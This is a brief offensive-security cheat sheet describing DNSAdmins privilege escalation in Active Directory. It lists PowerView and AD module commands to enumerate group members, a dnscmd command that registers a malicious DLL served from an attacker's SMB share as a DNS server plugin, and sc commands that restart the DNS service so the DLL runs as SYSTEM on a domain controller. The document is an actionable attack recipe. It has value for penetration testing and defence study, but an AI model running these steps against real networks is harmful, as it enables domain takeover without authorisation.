**WHAT IS THIS?:**

If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of `dns.exe` that runs as `SYSTEM`. In case the DC serves a DNS, the user can escalate his privileges to DA (Domain Admin). This exploitation process needs privileges to restart the DNS service to work.

---

1. Enumerate the members of the DNSAdmins group:
	- PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
	- AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it (there are many ways).
3. Then by serving a malicious DLL on a SMB share and configuring the `dll` usage,we can escalate our privileges:
- Using `dnscmd`:
```powershell
dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
```
- Restart the DNS Service:
```powershell
sc \\DNSServer stop dns
sc \\DNSServer start dns
```
